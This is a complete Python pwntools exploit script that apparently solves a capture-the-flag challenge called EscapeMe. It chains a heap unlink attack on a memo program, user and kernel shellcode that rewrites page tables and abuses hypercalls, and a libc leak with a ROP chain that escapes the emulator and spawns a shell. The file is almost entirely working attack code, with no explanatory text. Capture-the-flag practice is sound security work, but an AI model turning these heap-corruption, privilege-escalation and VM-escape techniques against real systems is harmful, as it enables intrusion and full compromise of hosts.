#!/usr/bin/env python2
import subprocess
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

conn = remote('escapeme.chal.ctf.westerns.tokyo', 16359)
challenge = conn.recvline().strip().split()[-1]
assert challenge[0] != '-'
with log.progress('Proof of work', challenge) as progress:
    resp = subprocess.check_output(['hashcash', '-qmb25', challenge]).strip()
    progress.success(resp)
conn.sendline(resp)
conn.recvuntil('> ')
conn.sendline(' '.join(['flag2.txt'] + ['x'] * 0x100))

memo_ptr = 0x604028
memo_addr = 0x7fff200000 - 0x1000
init_stack = 0x7ffffffff0

init_brk = 0x605000
init_top = init_brk + 0x1010

conn.recvuntil('> ')

def alloc(data):
    conn.sendline('1')
    conn.recvuntil('> ')
    conn.send(data)
    resp = conn.recvuntil('> ')
    return int(resp.split('\n')[0].split()[1].split(':')[1])

def edit(memo_id, data, read=True):
    conn.sendline('2')
    conn.recvuntil('> ')
    conn.sendline(str(memo_id))
    conn.recvuntil('> ')
    conn.send(data)
    if read:
        conn.recvuntil('> ')

def delete(memo_id):
    conn.sendline('3')
    conn.recvuntil('> ')
    conn.sendline(str(memo_id))
    conn.recvuntil('> ')

head_addr = init_top + 0x10
head = alloc('A' * 40)
target = alloc('B' * 40)

fake_chunk_ptr = memo_addr + (target + 1) * 0x10

fake_chunk = flat(
    0x0, # prev_size
    0x31, # size (prev_inuse)
    fake_chunk_ptr - 0x18, # fd
    fake_chunk_ptr - 0x10, # bk
    0
)

fake_chunk2 = flat(
    0x30, # prev_size
    0x10, # size (!prev_inuse)
)

controller = alloc(fake_chunk)
alloc(fake_chunk2)

edit(head, 'A' * 40 + chr(0x41))
delete(target)

shellcode = asm(r'''
    push 0x604000
    mov rsi, [rsp]
    mov rdx, 0x400
    xor eax, eax
    syscall
    ret
''')
assert len(shellcode) <= 40
alloc(shellcode.ljust(40, '\x90'))
shellcode_addr = init_top + 0x40

stack_addr = init_stack - 0x18
fake_memos = flat(
    stack_addr, 0
)
alloc(fake_memos)
fake_memos_addr = shellcode_addr + 0x30

edit(controller, p(memo_ptr + 1).rstrip('\0'))
edit(target, p(fake_memos_addr)[1:5])

fake_memo_index = (fake_memos_addr & 0xff) / 0x10
edit(fake_memo_index, p(shellcode_addr).rstrip('\0'), read=False)

conn.recvline()

shellcode = asm(r'''
// flag1
mov rax, 0x10C8
syscall

mov rdx, 7
mov rsi, 0x1000
mov rdi, rax
call mprotect

mov rdx, 0x60
mov rsi, rdi
call write

// Allocate a region.
mov rdx, 7
mov rsi, 0x2000
mov rdi, 0xd0000000
call mmap

// Free a page (actually frees the whole region).
mov rsi, 0x1000
mov rdi, 0xd0000000
call munmap

// Allocate a page at a different virtual address. This will allocate
// a page table at a physical address backing the large region.
mov rdx, 7
mov rsi, 0x1000
mov rdi, 0xe0000000
call mmap

// do_halt: 0x28

// map 0x0
mov rbx, 0xd0001000
movq [rbx], 0x7

mov rdx, 18
lea rsi, [rip+hello_str]
call write

// Read shellcode into do_halt.
mov rdx, 0x400
mov rsi, 0xe0000028
call read

jmp exit

mprotect:
    mov rax, __NR_mprotect
    syscall
    ret

mmap:
    mov rax, __NR_mmap
    syscall
    ret

munmap:
    mov rax, __NR_munmap
    syscall
    ret

write:
    mov rax, __NR_write
    syscall
    ret

exit:
    mov rax, __NR_exit
    syscall

read:
    mov rax, __NR_read
    syscall
    ret

hello_str:
  .ascii "\nHello from user!\n"
''')

assert len(shellcode) <= 0x400
conn.send(shellcode.ljust(0x400, '\x90'))
flag1 = conn.recvuntil('Hello from user!\n', drop=True).strip('\0\n')
log.success('flag1: %s', flag1)

kernel_shellcode = asm(r'''
mov ecx, 0x1000
xor edx, edx
xor esi, esi
mov edi, 2
call load_file

mov rdi, 0x8040000000
add rdi, rax
mov esi, 0x60
call write

mov rsi, 19
lea rdi, [rip+hello_str]
call write

cmd_loop:
  mov rdi, rsp
  mov rsi, 0x18
  call read
  mov rax, [rdi]

  cmp rax, 0
  // finish
  je done

  // set_phys
  cmp rax, 1
  jne read_write
  mov rdi, [rdi+8]
  call set_phys
  jmp cmd_loop

read_write:
  mov rsi, [rdi+0x10]
  mov rdi, [rdi+8]
  cmp rax, 2
  je do_read
  call write
  jmp cmd_loop
do_read:
  call read
  jmp cmd_loop

done:
    int3

// Map a 4 MiB page at 0x8000400000 to the physical address specified in rdi.
set_phys:
  mov rdx, 0x8040000000

  // pml4
  mov rax, cr3
  add rax, rdx

  // pdpt
  mov rax, [rax+8]
  and rax, 0xfffffffffffff000
  add rax, rdx

  // pdt
  mov rax, [rax]
  and rax, 0xfffffffffffff000
  add rax, rdx

  or rdi, 0x83
  mov [rax+0x10], rdi

  ret

read:
  mov rbx, rdi
  mov rcx, rsi
  // Supervisor!
  mov edx, 0
  mov eax, 0x10
  vmmcall
  ret

write:
  mov rbx, rdi
  mov rcx, rsi
  // Supervisor!
  mov edx, 0
  mov eax, 0x11
  vmmcall
  ret

// load_file(fileno, phys, off, size)
load_file:
  // flag2.txt
  mov rbx, rdi
  xchg rcx, rsi
  mov eax, 0x30
  vmmcall
  ret

hello_str:
  .ascii "Hello from kernel!\n"
''')

assert len(kernel_shellcode) <= 0x400
conn.send(kernel_shellcode.ljust(0x400, '\x90'))
flag2 = conn.recvuntil('Hello from kernel!\n', drop=True).strip('\0\n')
log.success('flag2: %s', flag2)

CMD_EXIT = 0
CMD_SET_PHYS = 1
CMD_READ = 2
CMD_WRITE = 3

virt_addr = 0x8000400000

def do_exit():
    conn.send(flat(
        CMD_EXIT,
        0,
        0,
    ))

def do_set_phys(addr):
    conn.send(flat(
        CMD_SET_PHYS,
        addr,
        0,
    ))

def do_read(addr, n):
    conn.send(flat(
        CMD_READ,
        addr,
        n,
    ))

def do_write(addr, n):
    conn.send(flat(
        CMD_WRITE,
        addr,
        n,
    ))

def rel_read(offset, n):
    do_set_phys(offset & 0xfffffffffffff000)
    do_write(virt_addr + (offset & 0xfff), n)
    return conn.recvn(n)

def rel_write(offset, data):
    do_set_phys(offset & 0xfffffffffffff000)
    do_read(virt_addr + (offset & 0xfff), len(data))
    conn.send(data)

# offset from memory region to libc base.
libc_base_offset = 0x400000

# offsets from libc base
main_arena_off = 0x3ebc40
main_arena_next_off = 0x3ec4b0

main_arena = u(rel_read(libc_base_offset + main_arena_next_off, 8))
libc_base = main_arena - main_arena_off
log.info('libc_base = %s', hex(libc_base))

def read(addr, n):
    return rel_read(addr - libc_base + libc_base_offset, n)

def write(addr, data):
    return rel_write(addr - libc_base + libc_base_offset, data)

environ_ptr = libc_base + 0x3EE098

environ = u(read(environ_ptr, 8))
log.info('environ = %s', hex(environ))

vm_loop_return = 0x400CAF

ret_addr_ptr = environ
with log.progress('Return address') as progress:
    while True:
        ret_addr_ptr -= 0x400
        stack = read(ret_addr_ptr, 0x400)
        ret_addr_off = stack.rfind(p(vm_loop_return))
        if ret_addr_off != -1:
            ret_addr_ptr += ret_addr_off
            break
    progress.success(hex(ret_addr_ptr))

addr = 0x400000
read = 0x4009C0
mprotect = libc_base + 0x11bae0
pop_rdi_ret = 0x403903
pop_rsi_r15_ret = 0x403901
pop_rdx_rbx_ret = libc_base + 0x11c65c

rop = flat(
    pop_rdi_ret, addr,
    pop_rsi_r15_ret, 0x1000, 0,
    pop_rdx_rbx_ret, 7, 0,
    mprotect,

    pop_rdi_ret, 0,
    pop_rsi_r15_ret, addr, 0,
    pop_rdx_rbx_ret, 0x400, 0,
    read,

    addr,
)

write(ret_addr_ptr, rop)
do_exit()

kvm_shellcode = asm(shellcraft.amd64.linux.sh())
assert len(kvm_shellcode) <= 0x400
conn.send(kvm_shellcode.ljust(0x400, '\x90'))

conn.interactive()
